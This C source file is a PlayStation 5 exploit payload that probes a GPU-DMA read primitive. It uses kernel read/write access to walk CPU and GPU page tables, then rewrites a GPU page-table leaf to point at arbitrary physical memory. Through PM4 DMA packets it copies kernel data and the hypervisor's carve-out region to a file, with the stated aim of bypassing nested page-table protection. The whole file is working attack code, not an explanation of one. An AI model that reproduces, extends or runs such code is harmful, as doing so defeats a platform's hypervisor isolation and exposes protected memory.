/* probe90/gpread90.elf — GPU-DMA READ probe: retarget the victim SRC leaf to a
 * physical with bit50 (system-coherent) SET and DMA-copy target->staging, then
 * read staging back from the CPU. Goal: dump the HV carve-out (0x60000000..) and
 * locate the VMCB guest-PA — proving the GPU READ bypasses the CPU NPT.
 *
 * Built from probe89/main7.c (the CONFIRMED KDATA-WRITE-PASS write primitive);
 * the ONLY change of substance is the DMA direction (src=victim(retargeted),
 * dst=staging) plus the sentinel-staging discriminator (staging pre-filled 0xA5,
 * so "staging unchanged" == silent no-op, "changed" == the GPU actually read).
 *
 * Phases:
 *   T-A  READ-KNOWN: retarget victim -> kernel .data PA (kdata base) + bit50,
 *        DMA 4KB src->staging, compare staging vs kernel_copyout. Proves the READ
 *        direction + bit50 against a known system-RAM page.
 *   T-B  CARVEOUT:  retarget victim -> carve-out chunks (0x60000000 + n*chunk,
 *        + bit50), DMA src->staging, dump staging to /data/carveout.bin. If the
 *        first chunk leaves staging unchanged (no-op) the probe stops and reports
 *        READ-NO-OP; if it returns data it sweeps the full 256MB carve-out.
 *
 * Log: /data/kex_gpread90.txt   Dump: /data/carveout.bin
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <ps5/kernel.h>
#include <ps5/payload.h>

extern const intptr_t KERNEL_ADDRESS_DMAP_BASE;

#define PROT_GPU_READ   0x10
#define PROT_GPU_WRITE  0x20
#define MAP_NO_COALESCE 0x00400000u
#define DMEM_TYPE_GARLIC 0xb
#define DMEM_RANGE_END   0x400000000ull

#define GPU_PDE_VALID   0x1ull
#define GPU_PDE_IS_PTE  (1ull << 54)
#define GPU_PDE_TF      (1ull << 56)
#define GPU_PDE_BIT50   (1ull << 50)
#define GPU_ADDR_MASK   0x0000FFFFFFFFFFC0ull
#define GPU_ADDR_8K_MASK 0x0000FFFFFFFFE000ull
#define GPU_ADDR_2M_MASK 0x0000FFFFFFE00000ull

#define GVMSPACE_SIZE        0x100
#define GVMSPACE_PAGE_DIR_VA 0x38
#define DATA_BASE_GVMSPACE   0x2EEA570u

#define GPU_SUBMIT_IOCTL    0xC0108102u
#define PM4_TYPE3           3u
#define PM4_OPCODE_DMA_DATA 0x50u
#define PM4_SHADER_COMPUTE  1u

#define CPU_PG_V     0x001ull
#define CPU_PG_PS    0x080ull
#define CPU_PG_FRAME 0x000FFFFFFFFFF000ull
#define RAM_MAX      0x400000000ull

#define OFFSET_KERNEL_PMAP_STORE 0x28c84a8ull

#define CARVEOUT_BASE 0x60000000ull
#define CARVEOUT_SIZE 0x10000000ull   /* 256 MB */

#define STAGE_FILL 0xA5u

static int      g_logfd = -1;
static uint64_t g_dmap;

static void logline(const char *m) {
  if (g_logfd >= 0) { write(g_logfd, m, strlen(m)); write(g_logfd, "\n", 1); fsync(g_logfd); }
  printf("%s\n", m);
}

typedef int (*fn_alloc_dmem)(off_t, off_t, size_t, size_t, int, off_t *);
typedef int (*fn_map_dmem)(void **, size_t, int, int, off_t, size_t);
typedef int (*fn_release_dmem)(off_t, size_t);
static fn_alloc_dmem   p_AllocateDirectMemory;
static fn_map_dmem     p_MapDirectMemory;
static fn_release_dmem p_ReleaseDirectMemory;

static int resolve_syms(void) {
  p_AllocateDirectMemory = (fn_alloc_dmem) dlsym(RTLD_DEFAULT, "sceKernelAllocateDirectMemory");
  p_MapDirectMemory      = (fn_map_dmem)   dlsym(RTLD_DEFAULT, "sceKernelMapDirectMemory");
  p_ReleaseDirectMemory  = (fn_release_dmem) dlsym(RTLD_DEFAULT, "sceKernelReleaseDirectMemory");
  if (!p_AllocateDirectMemory || !p_MapDirectMemory || !p_ReleaseDirectMemory) return -1;
  return 0;
}

static int read_phys(uint64_t pa, uint64_t *out) {
  if (pa >= RAM_MAX) return -1;
  return kernel_copyout((intptr_t)(g_dmap + pa), out, 8) == 0;
}

static uint64_t cpu_va_to_pa(uint64_t pml4_pa, uint64_t va) {
  uint64_t e;
  uint64_t i4=(va>>39)&0x1FF, i3=(va>>30)&0x1FF, i2=(va>>21)&0x1FF, i1=(va>>12)&0x1FF;
  if (pml4_pa >= RAM_MAX) return 0;
  if (!read_phys(pml4_pa+i4*8, &e) || !(e&CPU_PG_V)) return 0;
  uint64_t pdpt_pa = e&CPU_PG_FRAME;
  if (!read_phys(pdpt_pa+i3*8, &e) || !(e&CPU_PG_V)) return 0;
  if (e&CPU_PG_PS) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFFULL);
  uint64_t pd_pa = e&CPU_PG_FRAME;
  if (!read_phys(pd_pa+i2*8, &e) || !(e&CPU_PG_V)) return 0;
  if (e&CPU_PG_PS) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFFULL);
  uint64_t pt_pa = e&CPU_PG_FRAME;
  if (!read_phys(pt_pa+i1*8, &e) || !(e&CPU_PG_V)) return 0;
  return (e&CPU_PG_FRAME)|(va&0xFFFULL);
}

typedef struct { uint64_t gva, phys, pte_pa, raw; int is_2m; } leaf_t;
#define MAX_LEAVES 16384
static leaf_t leaves[MAX_LEAVES];
static int     nleaves = 0;

static void add_leaf(uint64_t gva, uint64_t phys, uint64_t pte_pa, uint64_t raw, int is_2m) {
  if (nleaves < MAX_LEAVES) {
    leaves[nleaves].gva=gva; leaves[nleaves].phys=phys; leaves[nleaves].pte_pa=pte_pa;
    leaves[nleaves].raw=raw; leaves[nleaves].is_2m=is_2m;
  }
  nleaves++;
}

static void walk_vmid(intptr_t gvmspace_base, int vmid) {
  uint64_t page_dir_va = kernel_getlong(gvmspace_base + (intptr_t)vmid * GVMSPACE_SIZE + GVMSPACE_PAGE_DIR_VA);
  if (!page_dir_va) return;
  for (int i4 = 0; i4 < 512; i4++) {
    uint64_t pml4e;
    if (kernel_copyout((intptr_t)(page_dir_va + i4 * 8), &pml4e, 8) != 0 || !(pml4e & GPU_PDE_VALID)) continue;
    uint64_t pdpt_pa = pml4e & GPU_ADDR_MASK;
    for (int i3 = 0; i3 < 512; i3++) {
      uint64_t pdpe;
      if (!read_phys(pdpt_pa + i3 * 8, &pdpe) || !(pdpe & GPU_PDE_VALID)) continue;
      uint64_t pd_pa = pdpe & GPU_ADDR_MASK;
      for (int i2 = 0; i2 < 512; i2++) {
        uint64_t pde;
        if (!read_phys(pd_pa + i2 * 8, &pde) || !(pde & GPU_PDE_VALID)) continue;
        uint64_t gva2 = ((uint64_t)i4 << 39) | ((uint64_t)i3 << 30) | ((uint64_t)i2 << 21);
        if (pde & GPU_PDE_IS_PTE) {
          add_leaf(gva2, pde & GPU_ADDR_MASK, pd_pa + i2 * 8, pde, 1);
        } else {
          uint64_t frag = (pde >> 59) & 0x1F;
          uint64_t ptb_pa = pde & GPU_ADDR_MASK;
          for (int i1 = 0; i1 < 256; i1++) {
            uint64_t pte;
            if (!read_phys(ptb_pa + i1 * 8, &pte) || !(pte & GPU_PDE_VALID)) continue;
            if ((pte & GPU_PDE_TF) && frag == 4) {
              uint64_t subtab = pte & GPU_ADDR_MASK;
              for (int i1b = 0; i1b < 8; i1b++) {
                uint64_t leaf;
                if (!read_phys(subtab + i1b * 8, &leaf) || !(leaf & GPU_PDE_VALID)) continue;
                add_leaf(gva2 | ((uint64_t)i1 << 16) | ((uint64_t)i1b << 13),
                         leaf & GPU_ADDR_8K_MASK, subtab + i1b * 8, leaf, 0);
              }
            } else {
              uint64_t shift = (frag == 1) ? 13 : 16;
              add_leaf(gva2 | ((uint64_t)i1 << shift), pte & GPU_ADDR_MASK, ptb_pa + i1 * 8, pte, 0);
            }
          }
        }
      }
    }
  }
}

static void build_dma_data(uint32_t *pkt, uint64_t src_va, uint64_t dst_va, uint32_t len_bytes) {
  pkt[0] = ((PM4_TYPE3 & 3u) << 30) | ((5u & 0x3FFFu) << 16)
         | ((PM4_OPCODE_DMA_DATA & 0xFFu) << 8) | ((PM4_SHADER_COMPUTE & 1u) << 1);
  pkt[1] = (1u << 31) | (2u << 25) | (1u << 27) | (2u << 13) | (1u << 15);
  pkt[2] = (uint32_t)(src_va & 0xFFFFFFFFull);
  pkt[3] = (uint32_t)(src_va >> 32);
  pkt[4] = (uint32_t)(dst_va & 0xFFFFFFFFull);
  pkt[5] = (uint32_t)(dst_va >> 32);
  pkt[6] = len_bytes & 0x1FFFFFu;
}

static void build_desc(uint64_t *d, uint64_t cmd_gpu_va, uint32_t dword_count) {
  d[0] = ((cmd_gpu_va & 0xFFFFFFFFull) << 32) | 0xC0023F00ull;
  d[1] = (((uint64_t)(dword_count & 0xFFFFFu)) << 32) | ((cmd_gpu_va >> 32) & 0xFFFFull);
}

struct gc_submit { uint32_t pipe_id; uint32_t count; uint64_t cmd_buf_ptr; };

/* READ-direction submit: src_gva -> dst_gva (no sentinel staged in cmd). */
static int submit_read(int gc, uint8_t *cmd_va, uint64_t cmd_gva,
                       uint64_t src_gva, uint64_t dst_gva, uint32_t len) {
  memset(cmd_va, 0, 0x100 + 0x10);
  build_dma_data((uint32_t*)cmd_va, src_gva, dst_gva, len);
  build_desc((uint64_t*)(cmd_va + 0x100), cmd_gva, 7);
  struct gc_submit sub = { 0, 1, (uint64_t)(uintptr_t)(cmd_va + 0x100) };
  int r = ioctl(gc, GPU_SUBMIT_IOCTL, &sub);
  usleep(500 * 1000);
  return r;
}

/* check if a staging region changed from the 0xA5 fill */
static int changed_from_fill(uint8_t *p, uint32_t len) {
  for (uint32_t i = 0; i < len; i++) if (p[i] != STAGE_FILL) return 1;
  return 0;
}

static void hex8(char *b, const uint8_t *p, int n) {
  int o = 0;
  for (int i = 0; i < n && o < 60; i++) o += sprintf(b + o, "%02x", p[i]);
  b[o] = 0;
}

int main(void) {
  g_logfd = open("/data/kex_gpread90.txt", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0666);
  g_dmap  = (uint64_t)(uintptr_t)KERNEL_ADDRESS_DMAP_BASE;
  char b[400];

  intptr_t kb = payload_get_args()->kdata_base_addr;
  snprintf(b, sizeof b, "gpread90: kdata=0x%llx fw=0x%x dmap=0x%llx",
           (unsigned long long)kb, kernel_get_fw_version(), (unsigned long long)g_dmap);
  logline(b);

  if (resolve_syms() != 0) { logline("FAIL: resolve syms"); return 1; }
  int gc = open("/dev/gc", O_RDWR);
  if (gc < 0) gc = open("/dev/gc0", O_RDWR);
  if (gc < 0) { logline("FAIL: cannot open /dev/gc"); return 1; }

  const size_t SZ = 0x200000;
  int prot = PROT_READ | PROT_WRITE | PROT_GPU_READ | PROT_GPU_WRITE;

  /* 8 garlic buffers: index 0..5 = victim candidates, 6 = staging, 7 = cmd */
  enum { NBUF = 8, STAGING_IDX = 6, CMD_IDX = 7 };
  void *gva[NBUF] = {0}; off_t goff[NBUF] = {0};
  for (int i = 0; i < NBUF; i++) {
    if (p_AllocateDirectMemory(0, DMEM_RANGE_END, SZ, SZ, DMEM_TYPE_GARLIC, &goff[i]) != 0 ||
        p_MapDirectMemory(&gva[i], SZ, prot, MAP_NO_COALESCE, goff[i], SZ) != 0) {
      logline("FAIL: garlic alloc/map"); return 1;
    }
  }

  uint64_t staging_gva = (uint64_t)(uintptr_t)gva[STAGING_IDX];
  uint64_t cmd_gva     = (uint64_t)(uintptr_t)gva[CMD_IDX];
  snprintf(b, sizeof b, "buffers: gva0=0x%llx staging=0x%llx cmd=0x%llx",
           (unsigned long long)(uintptr_t)gva[0],
           (unsigned long long)staging_gva, (unsigned long long)cmd_gva);
  logline(b);

  intptr_t gvmspace_base = (intptr_t)kb + (intptr_t)DATA_BASE_GVMSPACE;

  /* ---- kernel CR3 walk (for the known .data target PA) ---- */
  uint64_t target_kva = (uint64_t)kb;               /* read 4KB from the kdata base */
  uint64_t kp_kva     = (uint64_t)kb + OFFSET_KERNEL_PMAP_STORE;
  uint64_t kernel_cr3      = kernel_getlong((intptr_t)(kp_kva + 0x28)) & ~0xFFFull;
  uint64_t kernel_pml4_kva = kernel_getlong((intptr_t)(kp_kva + 0x20));
  if (!kernel_cr3 || (kernel_pml4_kva - g_dmap) != kernel_cr3) { logline("ABORT: kernel_pmap invariant"); return 1; }
  uint64_t target_pa = cpu_va_to_pa(kernel_cr3, target_kva);
  uint64_t anchor_pa = cpu_va_to_pa(kernel_cr3, (uint64_t)kb + 0x40);
  uint64_t anchor_kva = 0, anchor_dmap = 0;
  kernel_copyout((intptr_t)((uint64_t)kb + 0x40), &anchor_kva, 8);
  read_phys(anchor_pa, &anchor_dmap);
  if (!target_pa || anchor_kva == 0 || anchor_dmap != anchor_kva) { logline("ABORT: CR3 walk failed"); return 1; }
  snprintf(b, sizeof b, "target_kva=0x%llx target_pa=0x%llx (anchor PASS)",
           (unsigned long long)target_kva, (unsigned long long)target_pa);
  logline(b);

  /* ---- find dev vmid (maps garlic buffers at their CPU VA) ---- */
  int dev_vmid = -1;
  for (int vm = 0; vm < 16 && dev_vmid < 0; vm++) {
    nleaves = 0; memset(leaves, 0, sizeof leaves);
    walk_vmid(gvmspace_base, vm);
    int n = nleaves < MAX_LEAVES ? nleaves : MAX_LEAVES;
    for (int i = 0; i < n; i++) if (leaves[i].gva == (uint64_t)(uintptr_t)gva[0]) { dev_vmid = vm; break; }
  }
  snprintf(b, sizeof b, "dev vmid=%d", dev_vmid);
  logline(b);
  if (dev_vmid < 0) { logline("FAIL: no dev vmid"); return 1; }

  nleaves = 0; memset(leaves, 0, sizeof leaves);
  walk_vmid(gvmspace_base, dev_vmid);
  int n = nleaves < MAX_LEAVES ? nleaves : MAX_LEAVES;
  snprintf(b, sizeof b, "dev vmid leaves=%d", n);
  logline(b);

  /* ---- pick victim leaf: prefer a 2MB leaf from any candidate buffer ---- */
  leaf_t victim = {0};
  for (int i = 0; i < n && !victim.raw; i++) {
    for (int bi = 0; bi < STAGING_IDX; bi++) {
      if (leaves[i].gva == (uint64_t)(uintptr_t)gva[bi] && leaves[i].is_2m) { victim = leaves[i]; break; }
    }
  }
  /* fallback: any candidate leaf */
  if (!victim.raw) {
    for (int i = 0; i < n; i++) {
      for (int bi = 0; bi < STAGING_IDX; bi++) {
        if (leaves[i].gva == (uint64_t)(uintptr_t)gva[bi]) { victim = leaves[i]; break; }
      }
      if (victim.raw) break;
    }
  }
  if (!victim.raw) { logline("FAIL: victim leaf not found"); return 1; }
  snprintf(b, sizeof b, "victim leaf: gva=0x%llx phys=0x%llx pte_pa=0x%llx raw=0x%016llx is_2m=%d bit50=%d",
           (unsigned long long)victim.gva, (unsigned long long)victim.phys,
           (unsigned long long)victim.pte_pa, (unsigned long long)victim.raw, victim.is_2m,
           (victim.raw & GPU_PDE_BIT50) ? 1 : 0);
  logline(b);

  uint64_t mask     = victim.is_2m ? GPU_ADDR_2M_MASK : GPU_ADDR_8K_MASK;
  uint64_t leaf_off = victim.is_2m ? 0x1FFFFFull : 0x1FFFull;
  uint64_t leaf_sz  = victim.is_2m ? 0x200000ull : 0x2000ull;

  /* ================= T-A: READ-KNOWN (kernel .data 4KB) ================= */
  {
    uint64_t old = victim.raw;
    uint64_t base = target_pa & ~leaf_off;
    uint64_t off  = target_pa & leaf_off;
    uint64_t nw   = (old & ~mask) | (base & mask) | GPU_PDE_BIT50;
    snprintf(b, sizeof b, "T-A: retarget victim -> kdata PA base=0x%llx off=0x%llx (+bit50)",
             (unsigned long long)base, (unsigned long long)off);
    logline(b);

    static uint8_t ref[0x1000];
    kernel_copyout((intptr_t)target_kva, ref, sizeof ref);

    memset(gva[STAGING_IDX], STAGE_FILL, 0x1000);
    kernel_setlong((intptr_t)(g_dmap + victim.pte_pa), nw);
    int rr = submit_read(gc, (uint8_t*)gva[CMD_IDX], cmd_gva, victim.gva + off, staging_gva, 0x1000);
    kernel_setlong((intptr_t)(g_dmap + victim.pte_pa), old);

    uint8_t *got = (uint8_t*)gva[STAGING_IDX];
    int changed = changed_from_fill(got, 0x1000);
    int match = (memcmp(got, ref, 0x1000) == 0);
    char hg[70], hr[70];
    hex8(hg, got, 32); hex8(hr, ref, 32);
    snprintf(b, sizeof b, "T-A READ-KNOWN: ioctl=%d changed=%d match=%d got=%s ref=%s",
             rr, changed, match, hg, hr);
    logline(b);
    if (!match) logline("T-A RESULT: MISMATCH (read path or bit50 read NOT proven)");
    else logline("T-A RESULT: MATCH (READ + bit50 WORKS on system RAM)");
  }

  /* ================= T-B: CARVEOUT dump ================= */
  {
    int dumpfd = open("/data/carveout.bin", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0666);
    if (dumpfd < 0) { logline("FAIL: cannot open /data/carveout.bin"); return 1; }

    /* chunk size: 1MB for a 2MB victim leaf, else the 8KB leaf size */
    uint64_t chunk = victim.is_2m ? 0x100000ull : leaf_sz;
    uint64_t nchunks = CARVEOUT_SIZE / chunk;
    if (nchunks > 32768) { nchunks = 2048; logline("WARN: 8KB leaf, capping sweep at 2048 chunks (16MB)"); }
    snprintf(b, sizeof b, "T-B: carve-out sweep chunk=0x%llx nchunks=%llu",
             (unsigned long long)chunk, (unsigned long long)nchunks);
    logline(b);

    int read_ok = -1;   /* -1 unknown, 0 no-op, 1 ok */
    for (uint64_t ci = 0; ci < nchunks; ci++) {
      uint64_t pa   = CARVEOUT_BASE + ci * chunk;
      uint64_t base = pa & ~leaf_off;
      uint64_t off  = pa & leaf_off;
      uint64_t old  = victim.raw;
      uint64_t nw   = (old & ~mask) | (base & mask) | GPU_PDE_BIT50;

      memset(gva[STAGING_IDX], STAGE_FILL, chunk);
      kernel_setlong((intptr_t)(g_dmap + victim.pte_pa), nw);
      int rr = submit_read(gc, (uint8_t*)gva[CMD_IDX], cmd_gva, victim.gva + off, staging_gva, (uint32_t)chunk);
      kernel_setlong((intptr_t)(g_dmap + victim.pte_pa), old);

      uint8_t *got = (uint8_t*)gva[STAGING_IDX];
      int changed = changed_from_fill(got, (uint32_t)chunk);
      if (ci == 0) read_ok = changed ? 1 : 0;

      char h8[20];
      hex8(h8, got, 8);
      snprintf(b, sizeof b, "T-B chunk %llu pa=0x%llx ioctl=%d changed=%d first=%s",
               (unsigned long long)ci, (unsigned long long)pa, rr, changed, h8);
      logline(b);

      if (changed) write(dumpfd, got, chunk);
      else { static const uint8_t z[0x2000]; write(dumpfd, z, chunk); }

      if (ci == 0 && !changed) {
        /* first carve-out read was a silent no-op: probe one more offset to confirm */
        uint64_t pa2 = 0x62800000ull;   /* near old-fw HV anchors */
        uint64_t base2 = pa2 & ~leaf_off, off2 = pa2 & leaf_off;
        memset(gva[STAGING_IDX], STAGE_FILL, chunk);
        kernel_setlong((intptr_t)(g_dmap + victim.pte_pa), (old & ~mask) | (base2 & mask) | GPU_PDE_BIT50);
        submit_read(gc, (uint8_t*)gva[CMD_IDX], cmd_gva, victim.gva + off2, staging_gva, (uint32_t)chunk);
        kernel_setlong((intptr_t)(g_dmap + victim.pte_pa), old);
        got = (uint8_t*)gva[STAGING_IDX];
        int changed2 = changed_from_fill(got, (uint32_t)chunk);
        if (changed2) read_ok = 1;
        snprintf(b, sizeof b, "T-B recheck 0x62800000 changed=%d", changed2);
        logline(b);
        if (!changed2) {
          logline("T-B RESULT: READ-NO-OP (GPU read does NOT reach carve-out; no panic)");
          close(dumpfd);
          goto done;
        }
      }
    }
    close(dumpfd);
    if (read_ok == 1) logline("T-B RESULT: CARVEOUT-DUMPED (GPU READ bypasses NPT)");
    else logline("T-B RESULT: all chunks unchanged (no-op)");
  }

done:
  close(gc);
  logline("done");
  for (int i = 0; i < NBUF; i++) p_ReleaseDirectMemory(goff[i], SZ);
  return 0;
}
